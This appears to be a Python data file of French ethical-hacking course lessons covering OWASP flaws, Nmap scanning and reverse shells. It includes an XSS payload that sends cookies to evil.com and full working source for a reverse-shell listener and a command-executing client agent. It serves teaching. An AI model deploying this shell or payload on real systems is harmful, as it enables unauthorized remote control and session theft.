# -*- coding: utf-8 -*-
"""
Données pédagogiques exhaustives pour les Volumes 7, 8 et 9 de CyberPath & Python Hacking.
Couvre l'OWASP Top 10, Nmap, Burp Suite, CTF, les Reverse Shells Sockets, Keyloggers et la Persistance.
"""

import json

LESSONS_VOL7_TO_9 = [
    # -------------------------------------------------------------------------
    # VOLUME 7 : WEB SECURITY & AUTHENTIFICATION
    # -------------------------------------------------------------------------
    {
        "id": "les_cp_vol7_owasp",
        "module_id": "m_vol7_1",
        "slug": "owasp-top-10-xss-csrf-idor-ssrf-remediation",
        "title": "OWASP Top 10 : XSS, CSRF, IDOR & SSRF en Pratique",
        "summary": "Étude approfondie des vulnérabilités applicatives web majeures : Cross-Site Scripting (Reflected, Stored, DOM), CSRF, failles de contrôle d'accès IDOR et Server-Side Request Forgery.",
        "lesson_type": "article",
        "position": 1,
        "estimated_minutes": 50,
        "content_md": """# OWASP Top 10 : Vulnérabilités Web Majeures & Remédiations

Le projet **OWASP (Open Web Application Security Project)** publie régulièrement son classement des 10 risques de sécurité les plus critiques pour les applications Web. En tant que futur auditeur ou développeur sécurisé, la maîtrise de ces failles et de leurs mécanismes de défense est essentielle.

---

## 1. Cross-Site Scripting (XSS)

Le XSS consiste à injecter du code JavaScript malveillant dans une page web légitime consultée par d'autres utilisateurs. Le script s'exécute dans le contexte de sécurité du navigateur de la victime.

```
[ ATTAQUANT ]
     |
     v 1. Injection d'un payload : <script>document.location='http://evil.com/?c='+document.cookie</script>
[ SERVEUR WEB NON SÉCURISÉ ]
     |
     v 2. Rendu de la page HTML non assainie contenant le script malveillant
[ VICTIME LÉGITIME (Navigateur) ]
     |  -> Exécution du JavaScript dans le contexte d'origine de l'application
     v 3. Vol du cookie de session sensible
[ SERVEUR DE L'ATTAQUANT (evil.com) ]
```

### Les Trois Types de XSS :
1. **XSS Stocké (Stored / Persistent) :** Le payload est enregistré de manière permanente en base de données (ex: dans un commentaire de forum ou un profil utilisateur) et s'exécute chaque fois qu'un internaute affiche la page. C'est la forme la plus dangereuse.
2. **XSS Réfléchi (Reflected) :** Le payload provient de l'URL ou d'un paramètre GET (`?search=<script>...`) et est immédiatement répercuté dans la réponse HTML du serveur.
3. **XSS basé sur le DOM (DOM-based) :** La vulnérabilité réside entièrement dans le code JavaScript côté client qui manipule dangereusement le DOM (ex: utilisation de `innerHTML` ou `eval()` avec `window.location.hash`).

### Défense Contre le XSS :
* **Échappement contextuel (Context-aware Encoding) :** Encoder systématiquement les caractères réservés (`<` devient `&lt;`, `>` devient `&gt;`, `"` devient `&quot;`).
* **Politique de Sécurité du Contenu (Content Security Policy - CSP) :**
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
  ```
* **Flag HttpOnly sur les Cookies :** Interdit strictement à tout code JavaScript d'accéder au cookie d'authentification (`document.cookie`).

---

## 2. Insecure Direct Object References (IDOR / BOLA)

Une faille IDOR (ou *Broken Object-Level Authorization*) survient lorsqu'une application utilise un identifiant direct fourni par l'utilisateur pour accéder à une ressource sans vérifier que l'utilisateur en est bien le propriétaire légitime :

```http
# Requête légitime de l'utilisateur Alice (ID 42) :
GET /api/documents/invoice_42.pdf HTTP/1.1
Authorization: Bearer <Token_Alice>

# Attaque IDOR : Alice modifie simplement le numéro dans l'URL :
GET /api/documents/invoice_43.pdf HTTP/1.1
Authorization: Bearer <Token_Alice>
```
Si le serveur renvoie la facture de Bob (ID 43) sans vérifier la concordance entre le jeton de session d'Alice et la ressource 43, l'IDOR est confirmée !

### Remédiation IDOR :
Ne vous fiez jamais à l'identifiant transmis par l'URL. Associez toujours l'identifiant du compte connecté extrait du jeton de session validé :
```python
# Requête sécurisée avec contrôle d'autorisation au niveau de l'objet :
document = db.query("SELECT * FROM invoices WHERE id = ? AND owner_user_id = ?", (invoice_id, current_user.id))
if not document:
    raise HTTPException(status_code=403, detail="Accès non autorisé à cette ressource.")
```

---

## 3. Server-Side Request Forgery (SSRF)

Dans une faille SSRF, l'attaquant force le serveur web backend à émettre une requête réseau HTTP vers une destination interne normalement inaccessible depuis l'extérieur (ex: l'API de métadonnées AWS à l'adresse `http://169.254.169.254/latest/meta-data/` ou des microservices internes non authentifiés).

### Remédiation SSRF :
Valider les URLs fournies par une liste blanche stricte (Whitelisting), interdire les résolutions d'adresses IP privées (RFC 1918 : `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) et les adresses de lien local (`169.254.0.0/16`).
""",
        "exercise": {
            "title": "Échappement HTML Anti-XSS en Python",
            "description_md": "Écrivez une fonction Python `assainir_html(texte: str) -> str` qui remplace les caractères sensibles &, <, >, \", et ' par leurs entités HTML respectives (&amp;, &lt;, &gt;, &quot;, &#x27;).",
            "starter_code": "def assainir_html(texte: str) -> str:\n    # Votre code ici\n    pass\n",
            "solution_code": "def assainir_html(texte: str) -> str:\n    remplacements = {\n        '&': '&amp;',\n        '<': '&lt;',\n        '>': '&gt;',\n        '\"': '&quot;',\n        \"'\": '&#x27;'\n    }\n    for caractere, entite in remplacements.items():\n        texte = texte.replace(caractere, entite)\n    return texte\n",
            "difficulty": "beginner"
        },
        "quiz": {
            "title": "Quiz - Vulnérabilités Web OWASP",
            "passing_score": 100,
            "questions": [
                {
                    "prompt_md": "Quel drapeau de cookie HTTP empêche formellement un script JavaScript malveillant d'accéder au jeton de session via document.cookie ?",
                    "explanation_md": "Le drapeau `HttpOnly` interdit l'accès au cookie depuis l'API DOM/JavaScript du navigateur, neutralisant le vol de session par XSS.",
                    "options_json": json.dumps([
                        {"text": "HttpOnly", "is_correct": True},
                        {"text": "Secure", "is_correct": False},
                        {"text": "SameSite=Strict", "is_correct": False},
                        {"text": "Domain", "is_correct": False}
                    ]),
                    "points": 10
                },
                {
                    "prompt_md": "Quelle adresse IP spécifique est fréquemment ciblée lors d'une attaque SSRF sur des environnements Cloud AWS afin d'extraire les identifiants IAM d'une instance ?",
                    "explanation_md": "`http://169.254.169.254` est l'adresse de métadonnées d'instance (IMDS) sur AWS, Azure et GCP.",
                    "options_json": json.dumps([
                        {"text": "169.254.169.254 (Instance Metadata Service)", "is_correct": True},
                        {"text": "127.0.0.1", "is_correct": False},
                        {"text": "192.168.1.1", "is_correct": False},
                        {"text": "8.8.8.8", "is_correct": False}
                    ]),
                    "points": 10
                }
            ]
        }
    },

    # -------------------------------------------------------------------------
    # VOLUME 8 : OUTILS DU PENTESTER & MÉTHODOLOGIE CTF
    # -------------------------------------------------------------------------
    {
        "id": "les_cp_vol8_nmap",
        "module_id": "m_vol8_1",
        "slug": "reconnaissance-reseau-avancee-nmap-scripts-nse",
        "title": "Reconnaissance Réseau Avancée avec Nmap & Scripts NSE",
        "summary": "Cartographie complète de la surface d'attaque avec Nmap : scans furtifs SYN (-sS), prise d'empreinte de services (-sV), détection d'OS (-O) et scripts d'audit automatisés NSE.",
        "lesson_type": "article",
        "position": 1,
        "estimated_minutes": 45,
        "content_md": """# Reconnaissance Réseau avec Nmap & le Moteur de Scripts NSE

Considéré comme le standard absolu de la cartographie réseau depuis plus de 25 ans, **Nmap (Network Mapper)** est le premier outil dégainé lors d'un test d'intrusion ou d'un audit de conformité d'infrastructure.

---

## 1. Les Modes de Scan Majeurs de Nmap

```
+------------------+---------------------+---------------------------------------------------+
| COMMANDE         | TYPE DE SCAN        | MÉCANISME TECHNIQUE & DISCRÉTION                  |
+------------------+---------------------+---------------------------------------------------+
| nmap -sS <cible> | SYN Stealth Scan    | Envoie un SYN. Si SYN-ACK reçu, répond par un RST |
|                  | (Scan par défaut)   | pour ne jamais achever la poignée de main TCP !   |
+------------------+---------------------+---------------------------------------------------+
| nmap -sT <cible> | Connect Scan        | Établit une connexion TCP complète (connect()).   |
|                  |                     | Laisse des traces massives dans les journaux OS.  |
+------------------+---------------------+---------------------------------------------------+
| nmap -sU <cible> | UDP Scan            | Teste les ports UDP (DNS, SNMP, DHCP). Plus lent  |
|                  |                     | car attend les messages ICMP Port Unreachable.    |
+------------------+---------------------+---------------------------------------------------+
| nmap -sV <cible> | Version Detection   | Interroge les ports ouverts avec des sondes pour  |
|                  |                     | extraire la bannière et version exacte du service.|
+------------------+---------------------+---------------------------------------------------+
| nmap -p- <cible> | Full Port Scan      | Balaye l'intégralité des 65 535 ports TCP.        |
+------------------+---------------------+---------------------------------------------------+
```

---

## 2. La Commande d'Audit Recommandée en Pentest Réel

Pour auditer une cible dans le cadre d'un engagement professionnel, voici la syntaxe de référence combinant rapidité et richesse d'information :

```bash
sudo nmap -sS -sV -sC -O -T4 -p- -oA audit_cible_192.168.1.50 192.168.1.50
```

### Décomposition des arguments :
* **`-sS` :** Balayage SYN furtif (requiert les privilèges root sous Linux).
* **`-sV` :** Détection de version des logiciels serveurs (ex: `Apache 2.4.52`, `OpenSSH 8.9p1`).
* **`-sC` :** Exécution des scripts de détection par défaut du Nmap Scripting Engine (NSE).
* **`-O` :** Détection de l'empreinte du système d'exploitation par analyse de la pile TCP/IP.
* **`-T4` :** Profil temporel agressif (recommandé sur les réseaux locaux et fibre).
* **`-p-` :** Scanne **tous** les ports de 1 à 65535 (évite de passer à côté d'un port non standard comme un proxy sur 9000 ou 4444).
* **`-oA <nom>` :** Exporte les résultats sous les trois formats indispensables en simultané : texte brut (`.nmap`), grepable (`.gnmap`) et XML (`.xml`) pour importation dans les outils de reporting.

---

## 3. Le Moteur de Scripts NSE (Nmap Scripting Engine)

Écrits en langage **Lua**, les scripts NSE étendent les capacités de Nmap pour automatiser des tâches d'évaluation de vulnérabilités :

```bash
# Vérifier si une cible est vulnérable à la faille critique SMB EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.50

# Lister les certificats TLS et tester les chiffrements dépréciés (SSLv3, TLS 1.0)
nmap -p 443 --script ssl-enum-ciphers 192.168.1.50

# Énumérer les partages NFS ouverts sur le réseau
nmap -p 111,2049 --script nfs-showmount 192.168.1.50
```
""",
        "exercise": {
            "title": "Générateur de Lignes de Commande Nmap",
            "description_md": "Écrivez une fonction Python `generer_commande_nmap(cible: str, scan_complet: bool = False) -> str` qui retourne la chaîne de commande Nmap appropriée (`nmap -sS -sV -T4 <cible>` par défaut, ou `nmap -sS -sV -p- -T4 <cible>` si scan_complet est True).",
            "starter_code": "def generer_commande_nmap(cible: str, scan_complet: bool = False) -> str:\n    # Votre code ici\n    pass\n",
            "solution_code": "def generer_commande_nmap(cible: str, scan_complet: bool = False) -> str:\n    ports = \" -p-\" if scan_complet else \"\"\n    return f\"nmap -sS -sV{ports} -T4 {cible.strip()}\"\n",
            "difficulty": "beginner"
        },
        "quiz": {
            "title": "Quiz - Cartographie Réseau avec Nmap",
            "passing_score": 100,
            "questions": [
                {
                    "prompt_md": "Pourquoi le scan SYN (-sS) de Nmap est-il qualifié de 'furtif' (Stealth Scan) par rapport au Connect scan (-sT) ?",
                    "explanation_md": "Nmap envoie un paquet RST dès réception du SYN-ACK, annulant la connexion avant qu'elle ne soit complétée, ce qui évite que l'application applicative n'enregistre la connexion dans ses logs habituels.",
                    "options_json": json.dumps([
                        {"text": "Car il envoie un RST après le SYN-ACK et n'achève jamais la connexion TCP", "is_correct": True},
                        {"text": "Car il chiffre tous ses paquets avec AES-GCM", "is_correct": False},
                        {"text": "Car il utilise des adresses IP satellites", "is_correct": False},
                        {"text": "Car il ne transmet aucun paquet sur le réseau", "is_correct": False}
                    ]),
                    "points": 10
                },
                {
                    "prompt_md": "Quelle option de Nmap permet d'exécuter l'ensemble des scripts de détection standard écrits en langage Lua ?",
                    "explanation_md": "L'option `-sC` (équivalente à `--script=default`) active les scripts NSE sûrs et standard pour identifier les versions et vulnérabilités évidentes.",
                    "options_json": json.dumps([
                        {"text": "-sC (ou --script=default)", "is_correct": True},
                        {"text": "-sS", "is_correct": False},
                        {"text": "-sU", "is_correct": False},
                        {"text": "-sP", "is_correct": False}
                    ]),
                    "points": 10
                }
            ]
        }
    },

    # -------------------------------------------------------------------------
    # VOLUME 9 : PYTHON HACKING ÉTHIQUE (SOCKETS, RAT & REVERSE SHELLS)
    # -------------------------------------------------------------------------
    {
        "id": "les_cp_vol9_sockets",
        "module_id": "m_vol9_1",
        "slug": "architecture-reverse-shell-sockets-python-subprocess",
        "title": "Développement d'un Reverse Shell en Sockets Purs (Python)",
        "summary": "Architecture client/serveur d'un Reverse Shell robuste : sockets TCP natifs (AF_INET, SOCK_STREAM), redirection des flux d'exécution via subprocess et navigation de répertoires.",
        "lesson_type": "article",
        "position": 1,
        "estimated_minutes": 55,
        "content_md": """# Architecture d'un Reverse Shell en Python Pur (Sockets & Subprocess)

Issu des **Chapitres 6 et 7 de Python Hacking Éthique**, ce cours expose la mécanique fondamentale des chevaux de Troie d'accès distant (**Remote Access Trojans - RAT**) et des **Reverse Shells**.

---

## 1. Bind Shell vs Reverse Shell : Pourquoi le Reverse Shell ?

* **Bind Shell (Connexion Entrante) :** La machine compromise ouvre un port d'écoute (ex: port 4444). L'attaquant doit s'y connecter directement.
  * *Problème :* Dans 99% des cas, le routeur NAT et le pare-feu du réseau de l'entreprise bloquent toutes les connexions entrantes directes.
* **Reverse Shell (Connexion Sortante) :** L'attaquant configure un serveur d'écoute sur sa propre machine publique. C'est la machine compromise qui initie la connexion sortante vers l'attaquant (souvent sur le port 443 ou 80).
  * *Avantage tactique :* Les pare-feux autorisent généralement le trafic sortant vers les ports Web usuels. Le NAT est automatiquement traversé !

```
[ POSTE VICTIME COMPROMIS ]                   [ SERVEUR DE CONTRÔLE KALI ]
(Derrière un pare-feu NAT strict)                 (IP Publique ou Port Forwardé)
             |                                                  |
             | === 1. Connexion TCP sortante (Port 443) ======> | (En écoute : socket.bind)
             |                                                  |
             | <== 2. Envoi d'une commande shell ("whoami") === |
             |                                                  |
  Exécution locale :                                            |
  subprocess.check_output()                                     |
             |                                                  |
             | === 3. Renvoi de la sortie ("nt authority\\system") =>|
```

---

## 2. Le Serveur d'Écoute de l'Auditeur (`serveur_c2.py`)

Ce script s'exécute sur la machine de l'auditeur. Il attend la connexion entrante du poste cible et fournit un prompt de commande interactif :

```python
import socket

def lancer_serveur_ecoute(hote: str = "0.0.0.0", port: int = 4444):
    serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Permet de réutiliser immédiatement l'adresse après fermeture
    serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    serveur.bind((hote, port))
    serveur.listen(1)
    print(f"[*] Serveur d'écoute RayLab en attente sur {hote}:{port}...")
    
    connexion, adresse_client = serveur.accept()
    print(f"[+] Connexion reçue avec succès depuis : {adresse_client[0]}:{adresse_client[1]}")
    
    with connexion:
        while True:
            commande = input("RayLab-Shell> ")
            if not commande.strip():
                continue
            
            # Envoi de la commande encodée en octets
            connexion.sendall(commande.encode("utf-8"))
            
            if commande.strip().lower() == "exit":
                print("[*] Fermeture de la session.")
                break
                
            # Réception du résultat de la commande
            reponse = connexion.recv(8192).decode("utf-8", errors="replace")
            print(reponse)

if __name__ == "__main__":
    lancer_serveur_ecoute()
```

---

## 3. Le Client Reverse Shell sur le Poste Cible (`client_agent.py`)

Ce script s'exécute sur la machine auditée. Il se connecte au serveur et exécute les commandes transmises à l'aide de `subprocess` et `os` :

```python
import socket
import subprocess
import os

IP_SERVEUR = "192.168.1.100"  # Adresse de la machine attaquante
PORT_SERVEUR = 4444

def demarrer_agent():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((IP_SERVEUR, PORT_SERVEUR))
    except Exception as e:
        return # Échec de connexion silencieux
        
    while True:
        try:
            commande = client.recv(4096).decode("utf-8")
            if not commande or commande.strip().lower() == "exit":
                break
                
            # Gestion spéciale du changement de répertoire (cd)
            if commande.startswith("cd "):
                dossier = commande[3:].strip()
                try:
                    os.chdir(dossier)
                    resultat = f"[+] Répertoire courant modifié : {os.getcwd()}\\n"
                except Exception as err:
                    resultat = f"[-] Erreur de navigation : {err}\\n"
            else:
                # Exécution sécurisée avec capture conjointe de stdout et stderr
                resultat = subprocess.check_output(
                    commande,
                    shell=True,
                    stderr=subprocess.STDOUT
                ).decode("utf-8", errors="replace")
                
            client.sendall(resultat.encode("utf-8"))
        except Exception as e:
            client.sendall(f"[-] Erreur d'exécution : {e}\\n".encode("utf-8"))
            
    client.close()

if __name__ == "__main__":
    demarrer_agent()
```

> [!CAUTION]
> Ce code est fourni à des fins strictement éducatives et pédagogiques dans le cadre de cours d'ingénierie logicielle et d'audit autorisé. Tout déploiement non autorisé sur un système tiers constitue une infraction pénale passible des peines prévues par l'article 323-1 du Code pénal.
""",
        "exercise": {
            "title": "Changement de Répertoire Distant en Python",
            "description_md": "Écrivez une fonction Python `traiter_commande_cd(commande: str) -> str` qui prend une commande tapée (ex: 'cd /tmp') et exécute `os.chdir()` vers le dossier cible, puis retourne le chemin absolu courant. En cas d'erreur, elle retourne 'ERREUR'.",
            "starter_code": "import os\n\ndef traiter_commande_cd(commande: str) -> str:\n    # Votre code ici\n    pass\n",
            "solution_code": "import os\n\ndef traiter_commande_cd(commande: str) -> str:\n    if not commande.startswith('cd '):\n        return 'ERREUR'\n    cible = commande[3:].strip()\n    try:\n        os.chdir(cible)\n        return os.getcwd()\n    except Exception:\n        return 'ERREUR'\n",
            "difficulty": "intermediate"
        },
        "quiz": {
            "title": "Quiz - Programmation Réseau de Reverse Shells",
            "passing_score": 100,
            "questions": [
                {
                    "prompt_md": "Pourquoi l'instruction 'cd' doit-elle être gérée de manière spécifique avec os.chdir() plutôt que transmise simplement à subprocess.check_output() ?",
                    "explanation_md": "`subprocess.check_output()` lance un sous-processus éphémère. Si on y exécute `cd`, le répertoire ne change que dans le processus fils qui s'éteint immédiatement, sans impacter le processus Python persistant.",
                    "options_json": json.dumps([
                        {"text": "Car subprocess s'exécute dans un processus fils isolé qui ne modifie pas l'environnement du parent", "is_correct": True},
                        {"text": "Car le shell Linux interdit l'utilisation de cd en ligne de commande", "is_correct": False},
                        {"text": "Car les sockets TCP ne supportent pas les chaînes de caractères courtes", "is_correct": False},
                        {"text": "Car os.chdir() chiffre les fichiers système", "is_correct": False}
                    ]),
                    "points": 10
                },
                {
                    "prompt_md": "Quel avantage décisif offre un Reverse Shell par rapport à un Bind Shell face à un réseau d'entreprise protégé par un routeur NAT ?",
                    "explanation_md": "Un Reverse Shell génère une connexion sortante initiée depuis la machine interne, ce qui traverse automatiquement les passerelles NAT et la plupart des pare-feux.",
                    "options_json": json.dumps([
                        {"text": "Il initie une connexion sortante qui traverse naturellement les routeurs NAT et pare-feux", "is_correct": True},
                        {"text": "Il contourne automatiquement les mots de passe root", "is_correct": False},
                        {"text": "Il fonctionne sans installer Python sur la cible", "is_correct": False},
                        {"text": "Il désactive automatiquement Windows Defender", "is_correct": False}
                    ]),
                    "points": 10
                }
            ]
        }
    }
]

print(f"Loaded {len(LESSONS_VOL7_TO_9)} lessons for Volumes 7-9.")
